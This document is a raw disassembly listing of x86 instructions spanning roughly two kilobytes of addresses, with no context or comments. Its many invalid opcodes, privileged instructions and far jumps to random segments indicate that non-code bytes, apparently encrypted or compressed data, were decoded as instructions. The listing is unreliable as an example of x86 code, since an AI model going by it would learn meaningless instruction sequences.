  41949d:	sbb    esp,DWORD PTR [edx+0x2]
  4194a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194a1:	dec    ebx
  4194a2:	jg     0x41946e
  4194a4:	aaa    
  4194a5:	mov    esp,0xcd09a3fe
  4194aa:	outs   dx,BYTE PTR ds:[esi]
  4194ab:	lea    edx,[edi-0x8a2023b]
  4194b1:	jmp    0xd2e9df10
  4194b6:	mov    al,0x99
  4194b8:	icebp  
  4194b9:	popf   
  4194ba:	leave  
  4194bb:	or     bl,ah
  4194bd:	xor    eax,DWORD PTR [edi+0x33755d98]
  4194c3:	adc    al,0x5
  4194c5:	(bad)  
  4194c6:	rcr    DWORD PTR [ecx+0x124cb5b5],cl
  4194cc:	clc    
  4194cd:	jns    0x419465
  4194cf:	fadd   QWORD PTR [edi+0x4ef59fbe]
  4194d5:	inc    ebx
  4194d6:	push   0x938be32e
  4194db:	xchg   edx,eax
  4194dc:	push   eax
  4194dd:	xor    ebp,DWORD PTR [eax]
  4194df:	lods   eax,DWORD PTR ds:[esi]
  4194e0:	or     BYTE PTR [edx+0x6a],0x77
  4194e4:	add    eax,esi
  4194e6:	sub    ch,dl
  4194e8:	or     eax,0x66d0e1c8
  4194ed:	es (bad) 
  4194ef:	imul   esi,DWORD PTR [ecx],0x90c501c8
  4194f5:	cmc    
  4194f6:	shl    DWORD PTR [edx-0x73ccdd6e],cl
  4194fc:	scas   al,BYTE PTR es:[edi]
  4194fd:	sub    bh,BYTE PTR [ebp+0x21]
  419500:	pop    edi
  419501:	push   esp
  419502:	and    eax,0xec55319d
  419507:	mov    esi,0xafc146db
  41950c:	mov    ds:0x46e0e234,eax
  419511:	out    dx,eax
  419512:	sbb    ecx,DWORD PTR [eax+0x13]
  419515:	in     eax,dx
  419516:	(bad)  
  419519:	add    dh,dl
  41951b:	sub    BYTE PTR [edx],cl
  41951d:	jg     0x4194d6
  41951f:	dec    edx
  419520:	push   0xffffff8d
  419522:	inc    ebp
  419523:	pusha  
  419524:	jno    0x419519
  419526:	stos   BYTE PTR es:[edi],al
  419527:	sahf   
  419528:	stc    
  419529:	inc    ebp
  41952a:	shl    BYTE PTR [esi],0x3b
  41952d:	jmp    0xcb70ab69
  419532:	xchg   ebp,eax
  419533:	jl     0x41959d
  419535:	push   esp
  419536:	pop    esi
  419537:	fs xchg ebx,eax
  419539:	adc    eax,0xa742ef97
  41953e:	xor    BYTE PTR [edx-0x78],cl
  419541:	push   cs
  419542:	fs aaa 
  419544:	pop    ebp
  419545:	call   0xdfc2:0xfc0c904e
  41954c:	jmp    0x2076:0x82093b26
  419553:	out    0xc1,eax
  419555:	mov    esp,?
  419557:	test   eax,0x4fd0ebac
  41955c:	int3   
  41955d:	icebp  
  41955e:	jne    0x419599
  419560:	mov    ah,BYTE PTR [ecx]
  419562:	cmp    esp,0x69
  419565:	jle    0x419576
  419567:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  419569:	pop    esi
  41956a:	xor    ebx,DWORD PTR [ecx+0x30b117ea]
  419570:	loopne 0x419566
  419572:	inc    esi
  419573:	or     al,0xc2
  419575:	fucomp st(5)
  419577:	fcmovbe st,st(1)
  419579:	jmp    0x4195de
  41957b:	and    eax,0x68e350d0
  419580:	scas   eax,DWORD PTR es:[edi]
  419581:	jg     0x4195f0
  419583:	or     DWORD PTR [edx+ebx*2],0xffffff8f
  419587:	in     al,0xbb
  419589:	in     al,dx
  41958a:	xchg   ecx,eax
  41958b:	fs pop eax
  41958d:	pop    ecx
  41958e:	mov    ds:0x293141df,al
  419593:	test   BYTE PTR [edi+0x32894d77],dh
  419599:	mov    dh,0x41
  41959b:	pop    ecx
  41959c:	or     ecx,DWORD PTR [edx-0x3]
  41959f:	aam    0x87
  4195a1:	sbb    esi,DWORD PTR [edx+0xd1b3312]
  4195a7:	push   ds
  4195a8:	(bad)  
  4195a9:	cmp    eax,0x3b11a274
  4195ae:	das    
  4195af:	lods   eax,DWORD PTR ds:[esi]
  4195b0:	arpl   WORD PTR [edx+0x21],cx
  4195b3:	xlat   BYTE PTR ds:[ebx]
  4195b4:	pop    esp
  4195b5:	jo     0x4195b0
  4195b7:	add    BYTE PTR [eax],cl
  4195b9:	sbb    ecx,ebp
  4195bb:	or     bh,BYTE PTR [ecx+0x1c337adc]
  4195c1:	mov    eax,0xd8c42d35
  4195c6:	jmp    0x41954e
  4195c8:	rol    BYTE PTR [esi],1
  4195ca:	mov    bh,0x78
  4195cc:	test   DWORD PTR [esi+0xb],edx
  4195cf:	scas   eax,DWORD PTR es:[edi]
  4195d0:	(bad)  
  4195d1:	push   cs
  4195d2:	mov    ebx,0x8632b819
  4195d7:	jae    0x4195bf
  4195d9:	ja     0x419614
  4195db:	xchg   ecx,eax
  4195dd:	das    
  4195de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195df:	std    
  4195e0:	inc    ebx
  4195e1:	inc    eax
  4195e2:	shl    DWORD PTR [ebp+0x5a],cl
  4195e5:	sub    eax,0x9ed3027a
  4195ea:	stos   BYTE PTR es:[edi],al
  4195eb:	inc    eax
  4195ec:	adc    DWORD PTR cs:[edx+edi*2],eax
  4195f0:	pop    ebp
  4195f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195f2:	es jg  0x41965f
  4195f5:	(bad)  
  4195f6:	arpl   bp,ax
  4195f8:	fdivr  QWORD PTR [edx+0x17]
  4195fb:	mov    ds:0x3e5f7534,al
  419600:	mov    ecx,0x690d40d3
  419605:	(bad)  
  419606:	jle    0x41966f
  419608:	push   0x4a1e02d2
  41960d:	and    eax,0x526b14bd
  419612:	mov    esi,0xf53f11f9
  419617:	or     eax,0xb3239fab
  41961c:	xor    al,0x7e
  41961e:	outs   dx,BYTE PTR ds:[esi]
  41961f:	push   ds
  419620:	mov    gs,edx
  419622:	(bad)  
  419623:	xchg   ebp,eax
  419624:	sbb    ah,BYTE PTR [eax+0x66387ba2]
  41962a:	xchg   esp,eax
  41962b:	std    
  41962c:	imul   DWORD PTR [edi+0x56b444a5]
  419632:	mov    ebp,0x4204cfe0
  419637:	fwait
  419638:	test   eax,0x5edb3957
  41963d:	lods   al,BYTE PTR ds:[esi]
  41963e:	adc    BYTE PTR [ebx+0x5b],dh
  419641:	jne    0x4195e1
  419643:	push   ds
  419644:	inc    ecx
  419645:	cmc    
  419646:	add    al,0x1e
  419648:	stos   DWORD PTR es:[edi],eax
  419649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41964a:	scas   eax,DWORD PTR es:[edi]
  41964b:	inc    esp
  41964c:	adc    ebp,esp
  41964e:	jecxz  0x419695
  419650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419651:	and    BYTE PTR [eax+0x5d],dh
  419654:	and    DWORD PTR [esi+0x7f],edi
  419657:	test   ch,ch
  419659:	mov    ds:0xcc6a4794,eax
  41965e:	push   ecx
  41965f:	int    0xf9
  419661:	sahf   
  419662:	or     edx,0x79
  419665:	sub    edx,DWORD PTR [eax+0x2a]
  419668:	(bad)  
  419669:	jno    0x419624
  41966b:	add    al,0xb4
  41966d:	inc    edi
  41966e:	mov    bl,0x36
  419670:	jb     0x41963a
  419672:	sti    
  419673:	jg     0x4196b1
  419675:	idiv   DWORD PTR [ebx]
  419677:	aas    
  419678:	test   BYTE PTR [edx-0x47336745],ah
  41967e:	add    al,0x9f
  419680:	add    DWORD PTR [ecx+edi*2],0x92ea4cac
  419687:	dec    esp
  419688:	pop    edi
  419689:	sahf   
  41968a:	pop    ebp
  41968b:	lods   al,BYTE PTR ds:[esi]
  41968c:	cwde   
  41968d:	jo     0x41965f
  41968f:	push   0x2705d4de
  419694:	je     0x41965f
  419696:	mov    al,ds:0x23ffe1
  41969b:	jmp    0x38348422
  4196a0:	push   ecx
  4196a1:	mov    bl,al
  4196a3:	cli    
  4196a4:	in     eax,0x13
  4196a6:	cli    
  4196a7:	mov    ch,0xf5
  4196a9:	rcr    DWORD PTR [ecx-0xf],cl
  4196ac:	ss stc 
  4196ae:	inc    edi
  4196af:	bound  ecx,QWORD PTR [ebx]
  4196b1:	add    DWORD PTR [ecx+0x6e5c170b],0xffffffa9
  4196b8:	xor    BYTE PTR [ebp+0x4a],bh
  4196bb:	jge    0x419730
  4196bd:	js     0x419723
  4196bf:	cmp    DWORD PTR [edi],esi
  4196c1:	dec    edi
  4196c2:	data16 add cl,BYTE PTR [edi+0x4a]
  4196c6:	retf   0x188c
  4196c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ca:	push   ebx
  4196cb:	iret   
  4196cc:	std    
  4196cd:	dec    ebx
  4196ce:	xchg   edi,eax
  4196cf:	(bad)  
  4196d0:	fwait
  4196d1:	cmc    
  4196d2:	sub    eax,0x64e2ca6e
  4196d7:	outs   dx,DWORD PTR ds:[esi]
  4196d8:	loop   0x419698
  4196da:	std    
  4196db:	loope  0x419757
  4196dd:	jp     0x419751
  4196df:	or     ch,BYTE PTR [edi-0x19]
  4196e2:	repz lds edi,FWORD PTR [eax-0x2f]
  4196e6:	adc    eax,0x615e2419
  4196eb:	fadd   DWORD PTR [edi+0x4d]
  4196ee:	xlat   BYTE PTR ds:[ebx]
  4196ef:	scas   eax,DWORD PTR es:[edi]
  4196f0:	(bad)  
  4196f1:	push   ss
  4196f2:	(bad)  [ecx+0x4c604852]
  4196f8:	stos   DWORD PTR es:[edi],eax
  4196f9:	popa   
  4196fa:	cli    
  4196fb:	mov    al,gs:0xdff5009c
  419701:	adc    DWORD PTR [edx+0x34f83841],ebx
  419707:	scas   al,BYTE PTR es:[edi]
  419708:	adc    BYTE PTR [eax],ah
  41970a:	outs   dx,DWORD PTR ds:[esi]
  41970b:	mov    bl,0xb4
  41970d:	push   ebp
  41970e:	mov    edx,esp
  419710:	out    0xd9,al
  419712:	jns    0x419711
  419714:	cdq    
  419715:	(bad)  
  419716:	gs inc esp
  419718:	and    ecx,DWORD PTR [ebx-0x66ea09fe]
  41971e:	fisttp WORD PTR ds:0x793e2058
  419724:	pop    eax
  419725:	fsubr  DWORD PTR [edx]
  419727:	loope  0x4196c9
  419729:	lds    ebp,FWORD PTR [edi+0x24]
  41972c:	mov    esp,0xa5ec87b
  419731:	jg     0x4196b7
  419733:	mov    dh,0xbe
  419735:	pop    ebx
  419736:	and    BYTE PTR [edi],dh
  419738:	cwde   
  419739:	fcmovb st,st(0)
  41973b:	pop    ebp
  41973c:	mov    esi,0x6d668709
  419741:	xor    BYTE PTR [ecx-0x75],bl
  419744:	push   edx
  419745:	cwde   
  419746:	dec    esi
  419747:	add    al,0x1c
  419749:	sub    BYTE PTR [esi],bh
  41974b:	cmp    dh,BYTE PTR [esi]
  41974d:	test   bh,al
  41974f:	and    BYTE PTR [edx],0xb2
  419752:	jge    0x4197c2
  419754:	lods   eax,DWORD PTR ds:[esi]
  419755:	sub    BYTE PTR [edi+0x58b520dc],dh
  41975b:	add    ecx,DWORD PTR [eax+0x61]
  41975e:	mov    al,ds:0x9dc8cc97
  419763:	shl    BYTE PTR [edx],0x71
  419766:	pop    ebp
  419767:	jo     0x419749
  419769:	test   eax,0x503ae8e0
  41976e:	enter  0xbe1c,0x43
  419772:	add    esp,DWORD PTR [edi]
  419774:	je     0x419772
  419776:	std    
  419777:	xlat   BYTE PTR ds:[ebx]
  419778:	inc    edi
  419779:	cwde   
  41977a:	mov    ds:0xa0286ab5,eax
  41977f:	call   0x3b:0xf47ed2ab
  419786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419787:	clc    
  419788:	inc    ebx
  419789:	adc    ecx,DWORD PTR [esi+ebx*2+0x47]
  41978d:	retf   0xb758
  419790:	mov    ecx,0x48368259
  419795:	and    al,0xeb
  419798:	inc    eax
  419799:	sbb    BYTE PTR [ecx+0x70ea945b],dh
  41979f:	daa    
  4197a0:	stos   DWORD PTR es:[edi],eax
  4197a1:	adc    eax,0xfd436ed4
  4197a6:	pushf  
  4197a7:	(bad)  
  4197a8:	jl     0x419810
  4197aa:	and    BYTE PTR [ebx],dh
  4197ac:	cwde   
  4197ad:	sub    al,0xce
  4197af:	or     DWORD PTR [edi-0x36],edi
  4197b2:	dec    esp
  4197b3:	mov    esp,0x5804e0fe
  4197b8:	lods   eax,DWORD PTR ds:[esi]
  4197b9:	scas   eax,DWORD PTR es:[edi]
  4197ba:	jle    0x4197c6
  4197bc:	xor    eax,DWORD PTR [edx]
  4197be:	pop    edi
  4197bf:	clc    
  4197c0:	je     0x4197b9
  4197c2:	jnp    0x4197ee
  4197c4:	dec    edi
  4197c5:	fcomp  DWORD PTR [ecx-0x5a]
  4197c8:	jns    0x419771
  4197ca:	cmp    eax,0xa9772853
  4197cf:	addr16 push ecx
  4197d1:	js     0x419803
  4197d3:	xchg   esi,eax
  4197d4:	pop    ebx
  4197d5:	cld    
  4197d6:	test   eax,0xf2188bf0
  4197db:	test   eax,0xb1a92cdc
  4197e0:	or     al,0xb8
  4197e2:	call   0x976:0x22ae4ba3
  4197e9:	dec    ebp
  4197ea:	rcl    ebx,0x20
  4197ed:	mov    edx,DWORD PTR [edi+0x3fb9028c]
  4197f3:	pop    edi
  4197f4:	pop    ds
  4197f5:	sbb    esp,DWORD PTR [edi]
  4197f7:	aas    
  4197f8:	pushf  
  4197f9:	jbe    0x419801
  4197fb:	shl    BYTE PTR [ecx+0x217d0491],cl
  419801:	iret   
  419802:	in     eax,dx
  419803:	xor    BYTE PTR [edi],bh
  419805:	test   al,0xee
  419807:	dec    ebx
  419808:	std    
  419809:	dec    ebp
  41980a:	xchg   esi,eax
  41980b:	inc    edi
  41980c:	and    al,dl
  41980e:	inc    esp
  41980f:	add    eax,0x52d22dc7
  419814:	imul   eax
  419816:	fldenv [ebp-0x54467a63]
  41981c:	sub    eax,ecx
  41981e:	sbb    esp,DWORD PTR [ebx]
  419820:	add    al,0x1a
  419822:	pop    ss
  419823:	push   ds
  419824:	add    eax,0xd4a785d
  419829:	enter  0x9ebe,0x32
  41982d:	push   cs
  41982e:	(bad)  
  41982f:	cmp    cl,BYTE PTR [eax-0x69]
  419832:	jl     0x41986a
  419834:	daa    
  419835:	push   esp
  419836:	in     al,dx
  419837:	mov    eax,ds:0x984d739a
  41983c:	daa    
  41983d:	aam    0x50
  41983f:	and    al,0xf
  419841:	adc    cl,dl
  419843:	dec    edi
  419844:	outs   dx,DWORD PTR ds:[esi]
  419845:	mov    ah,0x65
  419847:	stos   BYTE PTR es:[edi],al
  419848:	shl    DWORD PTR [edi],0xa0
  41984b:	or     eax,0x5ca70383
  419850:	mov    edx,0x7e01688f
  419855:	push   ds
  419856:	retf   0x318
  419859:	push   es
  41985a:	mov    esp,0xa2392dd3
  41985f:	adc    DWORD PTR [eax+0x3d],ebx
  419862:	sub    ecx,DWORD PTR [ebp-0xbb9596d]
  419868:	adc    DWORD PTR [edx+0x65],ebx
  41986b:	xchg   edi,eax
  41986c:	push   ebx
  41986d:	retf   
  41986e:	pop    es
  41986f:	repnz cld 
  419871:	push   ebx
  419872:	push   cs
  419873:	pop    esi
  419874:	aas    
  419875:	daa    
  419876:	clc    
  419877:	or     ch,BYTE PTR [edi+0x6bbf62ed]
  41987d:	mov    ebp,0x203fe99e
  419882:	push   es
  419883:	fcomp  DWORD PTR [eax+0x794a72dc]
  419889:	arpl   WORD PTR [ebx-0x1a],di
  41988c:	cmp    DWORD PTR [ecx+0x2307b164],eax
  419892:	mov    ch,0xd1
  419894:	lahf   
  419895:	and    ebx,DWORD PTR [ebp+0x19e171fe]
  41989b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41989c:	xchg   esi,eax
  41989d:	ins    DWORD PTR es:[edi],dx
  41989e:	test   al,0xe7
  4198a0:	ds es data16 (bad) 
  4198a4:	lods   eax,DWORD PTR ds:[esi]
  4198a5:	(bad)  
  4198a6:	mov    ch,0xa7
  4198a8:	dec    edi
  4198a9:	and    DWORD PTR es:[ebp+0x56],ebp
  4198ad:	mov    ?,WORD PTR [eax]
  4198af:	(bad)  
  4198b0:	stc    
  4198b1:	and    BYTE PTR [ebp+0x3d585d9c],0x99
  4198b8:	pop    ebx
  4198b9:	mov    ebx,0x412dba3c
  4198be:	popw   es
  4198c0:	nop
  4198c1:	push   ss
  4198c2:	push   0xffffffad
  4198c4:	fs and edx,esp
  4198c7:	xlat   BYTE PTR ds:[ebx]
  4198c8:	xchg   al,cl
  4198ca:	sbb    al,0x56
  4198cc:	ins    DWORD PTR es:[edi],dx
  4198cd:	xchg   esp,eax
  4198ce:	pop    ecx
  4198cf:	icebp  
  4198d0:	jae    0x41993b
  4198d2:	aad    0x61
  4198d4:	pop    ecx
  4198d5:	mov    ch,BYTE PTR [ebp+0x425bdae3]
  4198db:	pop    esi
  4198dc:	and    eax,DWORD PTR [ebp+0x57]
  4198df:	cmp    BYTE PTR [edi-0x62698535],ah
  4198e5:	popa   
  4198e6:	fdivr  st(5),st
  4198e8:	mov    ah,0x53
  4198ea:	call   0x3c24:0x2b054233
  4198f1:	les    edi,FWORD PTR [ecx+0x68eb382e]
  4198f7:	sbb    edi,DWORD PTR [ecx]
  4198f9:	inc    ebx
  4198fa:	push   eax
  4198fb:	into   
  4198fc:	arpl   WORD PTR [edi+0x4833e910],bp
  419902:	out    dx,eax
  419903:	jns    0x419969
  419905:	aad    0xf0
  419907:	jecxz  0x419963
  419909:	neg    BYTE PTR [esi+0x7]
  41990c:	jno    0x4198e2
  41990e:	mov    BYTE PTR [esi+eiz*2],bh
  419911:	aas    
  419912:	cmp    DWORD PTR [edi-0x28dbf0bf],esi
  419918:	repnz rcl BYTE PTR [ecx+ebx*1-0x57ac8941],1
  419920:	stos   BYTE PTR es:[edi],al
  419921:	sub    eax,0x9e2e3402
  419926:	xchg   edx,eax
  419927:	xchg   esi,eax
  419928:	lock loopne 0x41993c
  41992b:	iret   
  41992c:	retf   0x6446
  41992f:	fwait
  419930:	add    eax,0x285a2f41
  419935:	or     DWORD PTR [edi+eiz*1-0x50],ebp
  419939:	sbb    bl,BYTE PTR [ebx+ebx*8+0x121796a8]
  419940:	sbb    eax,DWORD PTR [edx+0x3]
  419943:	mov    al,0xd9
  419945:	es into 
  419947:	inc    edi
  419948:	mov    bh,0x4f
  41994a:	push   edi
  41994b:	or     dh,0xdc
  41994e:	cmp    bh,BYTE PTR [eax]
  419950:	and    bh,BYTE PTR [ebx-0x2c]
  419953:	push   0x3f79b175
  419958:	loopne 0x4199b2
  41995a:	mov    ebx,0xca5980e9
  41995f:	push   edi
  419960:	mov    eax,0x4e8900fb
  419965:	aaa    
  419966:	sub    ebx,DWORD PTR [edx-0x7a]
  419969:	dec    ecx
  41996a:	or     BYTE PTR [ebx],bl
  41996c:	jbe    0x419949
  41996e:	mov    ds:0xdace87a9,eax
  419973:	jne    0x419901
  419975:	mov    ecx,0xccf08ecb
  41997a:	iret   
  41997b:	cs jecxz 0x4199f4
  41997e:	shl    DWORD PTR [esp+edi*1-0x2acd5625],cl
  419985:	add    ecx,DWORD PTR [eax+0x534234eb]
  41998b:	mov    esi,0x25e1ec0a
  419990:	push   eax
  419991:	stos   BYTE PTR es:[edi],al
  419992:	ss icebp 
  419994:	test   edx,esp
  419996:	in     al,0x8a
  419998:	xchg   edx,eax
  419999:	sbb    eax,0xdc40841f
  41999e:	in     eax,0xff
  4199a0:	inc    edx
  4199a1:	test   bl,ch
  4199a3:	mov    cl,ch
  4199a5:	push   esp
  4199a6:	pop    edx
  4199a7:	cdq    
  4199a8:	jo     0x4199bd
  4199aa:	sub    edx,DWORD PTR [edi]
  4199ac:	cmc    
  4199ad:	aad    0x8f
  4199af:	mov    ebp,0x7d12dab6
  4199b4:	mov    dh,0x40
  4199b6:	push   esp
  4199b7:	adc    DWORD PTR [ebp-0x2b78e669],edx
  4199bd:	adc    DWORD PTR [eax],eax
  4199bf:	mov    eax,0x99b04ad9
  4199c4:	mov    cl,0x3a
  4199c6:	jmp    0xc476:0xbfcd6833
  4199cd:	mov    dh,0x25
  4199cf:	inc    ebx
  4199d0:	cmp    al,0xc2
  4199d2:	add    DWORD PTR es:[ebp-0x242783a5],edx
  4199d9:	idiv   DWORD PTR ds:0xd1435d26
  4199df:	je     0x419963
  4199e1:	loop   0x419a01
  4199e3:	dec    ebp
  4199e4:	mov    bl,bl
  4199e6:	ror    DWORD PTR [edx-0x56e5a50d],0x49
  4199ed:	or     bl,BYTE PTR ds:0xfbf522b8
  4199f3:	mov    eax,0xc8a421f8
  4199f8:	cs retf 0xf1a7
  4199fc:	xchg   DWORD PTR [ebx+0xf798226],eax
  419a02:	xchg   edx,eax
  419a03:	ss push ds
  419a05:	inc    eax
  419a06:	popf   
  419a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a08:	mov    bl,0xaa
  419a0a:	jmp    0x3951:0x3b37ee6f
  419a11:	and    DWORD PTR [ecx+0x4e5ff81b],ebx
  419a17:	ins    BYTE PTR es:[edi],dx
  419a18:	retf   0x7d9c
  419a1b:	ror    edx,0x33
  419a1e:	mov    bh,0xe6
  419a20:	add    dl,BYTE PTR [edi]
  419a22:	pop    edx
  419a23:	out    0x41,al
  419a25:	or     eax,0xc8307985
  419a2a:	push   ecx
  419a2b:	xchg   ecx,eax
  419a2c:	ds aam 0xfd
  419a2f:	push   esi
  419a30:	lock sbb esi,DWORD PTR [edi-0x20]
  419a34:	xchg   ebx,eax
  419a35:	repnz call 0x4811:0xe87bc4e
  419a3d:	sub    al,0xbd
  419a3f:	ins    DWORD PTR es:[edi],dx
  419a40:	in     al,dx
  419a41:	fwait
  419a42:	sti    
  419a43:	repz push ebp
  419a45:	lahf   
  419a46:	or     eax,0xa51d9880
  419a4b:	jle    0x4199da
  419a4d:	jg     0x4199d7
  419a4f:	sub    dl,bh
  419a51:	ins    DWORD PTR es:[edi],dx
  419a52:	dec    edx
  419a53:	dec    ebx
  419a54:	rcr    DWORD PTR [eax+0x58449012],0xa3
  419a5b:	and    ebx,DWORD PTR es:[ebp-0x3b510f36]
  419a62:	cli    
  419a63:	repnz lahf 
  419a65:	xchg   esi,eax
  419a66:	mov    dl,0xa4
  419a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a69:	pop    ds
  419a6a:	clc    
  419a6b:	add    bl,bl
  419a6d:	jnp    0x419a1a
  419a6f:	pop    esi
  419a70:	sti    
  419a71:	inc    eax
  419a72:	jne    0x419a79
  419a74:	lods   eax,DWORD PTR ds:[esi]
  419a75:	mov    cl,0x4c
  419a77:	js     0x419a6e
  419a79:	mov    ah,0xdf
  419a7b:	gs fcmovnbe st,st(0)
  419a7e:	retf   
  419a7f:	out    0xd8,eax
  419a81:	and    ecx,DWORD PTR [ecx]
  419a83:	inc    ecx
  419a84:	lock (bad) 
  419a86:	pop    esi
  419a87:	mov    ebp,0xf5be2200
  419a8c:	xchg   ebp,eax
  419a8d:	aad    0xc1
  419a8f:	sar    BYTE PTR [esi+0x54],0x2b
  419a93:	xor    esi,DWORD PTR [esp+edx*2]
  419a96:	mov    ch,0x16
  419a98:	dec    edx
  419a99:	int3   
  419a9a:	jmp    0xb196:0xdbf82836
  419aa1:	xchg   ebp,eax
  419aa2:	adc    esp,esp
  419aa4:	pop    ebx
  419aa5:	push   ds
  419aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aa7:	cld    
  419aa8:	cdq    
  419aa9:	xor    al,BYTE PTR [edx+0x21]
  419aac:	cli    
  419aad:	jns    0x419a86
  419aaf:	dec    esi
  419ab0:	stos   DWORD PTR es:[edi],eax
  419ab1:	inc    edi
  419ab2:	mov    bl,0x2c
  419ab4:	dec    edx
  419ab5:	gs call 0xae77:0xcc498889
  419abd:	std    
  419abe:	push   0xffffff9b
  419ac0:	mov    edi,0x6f634077
  419ac5:	dec    esi
  419ac6:	push   cs
  419ac7:	dec    edx
  419ac8:	push   0xfc90f569
  419acd:	mov    ds:0xa034be95,al
  419ad2:	(bad)  
  419ad4:	push   cs
  419ad5:	imul   edi,DWORD PTR [edx-0x6e],0xffffffcd
  419ad9:	push   ebx
  419ada:	fsub   DWORD PTR [edi+0x27f3838]
  419ae0:	das    
  419ae1:	mov    WORD PTR [esi+0x29916ece],gs
  419ae7:	inc    ebp
  419ae8:	clc    
  419ae9:	xor    DWORD PTR [edi+0x482d46b3],eax
  419aef:	jo     0x419b2a
  419af1:	adc    BYTE PTR [esi+eax*1+0x2a],0xb6
  419af6:	push   edi
  419af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af8:	lock repz xchg esp,eax
  419afb:	aam    0x78
  419afd:	rol    BYTE PTR [ecx+0xf],0x91
  419b01:	mov    bl,BYTE PTR [edx+0x5128f751]
  419b07:	lods   eax,DWORD PTR ds:[esi]
  419b08:	mov    edx,DWORD PTR [esi-0x6e095173]
  419b0e:	neg    DWORD PTR [ecx+eiz*8-0x1255a25]
  419b15:	lods   al,BYTE PTR ds:[esi]
  419b16:	sub    DWORD PTR [esi],ebx
  419b18:	mov    fs,WORD PTR [esi+ecx*8-0x25]
  419b1c:	imul   ebx,DWORD PTR [ecx-0x24674c1d],0x4c
  419b23:	push   ebx
  419b24:	adc    DWORD PTR [ebp-0x1f813a3b],eax
  419b2a:	xor    al,0xf3
  419b2c:	mov    eax,0x771a8232
  419b31:	mov    ah,0xdc
  419b33:	push   ebx
  419b34:	inc    esp
  419b35:	and    edi,ecx
  419b37:	fs out dx,eax
  419b39:	cld    
  419b3a:	mov    edi,0x879cad77
  419b3f:	jle    0x419b37
  419b41:	gs and eax,0xc54a59a6
  419b47:	cld    
  419b48:	jb     0x419b9f
  419b4a:	and    al,0xac
  419b4c:	xor    BYTE PTR [ebx],dh
  419b4e:	pop    edi
  419b4f:	sub    bl,BYTE PTR [esi-0x7e75882c]
  419b55:	loop   0x419ae9
  419b57:	mov    cl,0x7c
  419b59:	rcl    BYTE PTR [esi-0x78f27d23],0xc7
  419b60:	add    dh,BYTE PTR [eax-0x17]
  419b63:	lahf   
  419b64:	add    ebp,DWORD PTR [edx+eiz*4-0x1a]
  419b68:	idiv   BYTE PTR [eax-0x31]
  419b6b:	adc    eax,0x166529b4
  419b70:	in     eax,dx
  419b71:	pusha  
  419b72:	les    ebp,FWORD PTR [edi+0x327f1055]
  419b78:	xor    bh,al
  419b7a:	rcr    BYTE PTR [eax],1
  419b7c:	mov    edx,0x8751409f
  419b81:	cmp    edi,DWORD PTR [edi-0x3]
  419b84:	sub    esp,DWORD PTR [edi+eiz*2]
  419b87:	mov    DWORD PTR ds:0xd1ca1d40,ebp
  419b8d:	mov    ecx,0xaee59901
  419b92:	inc    eax
  419b93:	(bad)  
  419b94:	push   cs
  419b95:	mov    ds:0x963e5507,al
  419b9a:	xchg   edx,eax
  419b9b:	xor    DWORD PTR [ecx+0x68011f0f],edx
  419ba1:	cmp    edi,DWORD PTR [ecx-0x41]
  419ba4:	xor    eax,DWORD PTR [ebx]
  419ba6:	mov    eax,ds:0x4fef70fe
  419bab:	pushf  
  419bac:	pop    edx
  419bad:	mov    edi,0xcc5f7c22
  419bb2:	retf   
  419bb3:	ds push ecx
  419bb5:	add    al,BYTE PTR [ecx]
  419bb7:	mov    bh,0x46
  419bb9:	xchg   esp,eax
  419bba:	adc    ebp,DWORD PTR [edi]
  419bbc:	adc    eax,0x18e9b
  419bc1:	aam    0xa5
  419bc3:	adc    DWORD PTR [esi],ebp
  419bc5:	addr16 pop ebp
  419bc7:	fadd   DWORD PTR [ebp+0x3ac7cb1a]
  419bcd:	call   0x926a94f9
  419bd2:	mov    esi,0x54177129
  419bd7:	push   esp
  419bd8:	cmp    ecx,esi
  419bda:	jecxz  0x419b82
  419bdc:	and    DWORD PTR [ebx+0x56f83e4f],0x3c3c5809
  419be6:	pusha  
  419be7:	dec    esp
  419be8:	add    DWORD PTR [ebx+0x435df830],0xf128186
  419bf2:	mov    bh,0x57
  419bf4:	fwait
  419bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bf6:	or     al,0x9a
  419bf8:	pop    ds
  419bf9:	clc    
  419bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bfb:	stos   BYTE PTR es:[edi],al
  419bfc:	into   
  419bfd:	out    0x9a,ax
  419c00:	pop    eax
  419c01:	jno    0x419b8a
  419c03:	cmp    BYTE PTR [edi+0x57],ah
  419c06:	lds    edx,FWORD PTR [edx]
  419c08:	cli    
  419c09:	(bad)  
  419c0a:	push   ss
  419c0b:	sahf   
  419c0c:	jge    0x419bea
  419c0e:	and    al,0x36
  419c10:	stc    
  419c11:	dec    ebp
  419c12:	jb     0x419c44
  419c14:	sar    bh,cl
  419c16:	es sbb bh,dh
  419c19:	jp     0x419c72
  419c1b:	pop    ebx
  419c1c:	cmp    al,BYTE PTR [ebp+0x4e98dcd]
  419c22:	test   esi,esp
  419c24:	mov    bh,0xf
  419c26:	inc    eax
  419c27:	jns    0x419bf8
  419c29:	xchg   ebx,eax
  419c2a:	out    0x1f,eax
  419c2c:	mov    dl,0xd4
  419c2e:	loop   0x419c59
  419c30:	sbb    ah,BYTE PTR [ebp-0xb9881f5]
  419c36:	(bad)  
  419c37:	jmp    0xeac:0x144e25db
  419c3e:	outs   dx,DWORD PTR ds:[esi]
  419c3f:	pop    edx
  419c40:	mov    eax,ds:0xf9d5804d
  419c45:	fwait
  419c46:	jmp    0x3af0d3e5
  419c4b:	test   al,0xa3
  419c4d:	add    edx,DWORD PTR [ebx-0x72]
  419c50:	dec    ebp
  419c51:	int    0xe9
  419c53:	lea    edi,[ebp-0xe]
  419c56:	sub    esi,DWORD PTR [edi]
  419c58:	jns    0x419cb0
